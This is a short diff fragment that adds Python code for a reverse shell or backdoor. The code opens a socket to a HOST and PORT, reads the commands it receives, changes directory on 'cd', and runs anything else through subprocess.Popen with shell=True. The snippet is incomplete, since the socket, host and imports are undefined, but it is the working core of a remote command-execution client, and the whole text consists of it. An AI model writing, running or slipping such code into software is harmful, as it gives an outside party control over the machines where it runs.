@@ -1,0 +1,6 @@
+s.connect((HOST, PORT))
+data = s.recv(1024)
+if data[:2].decode("utf-8") == 'cd':
+    os.chdir(data[3:].decode("utf-8"))
+cmd = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE)
+
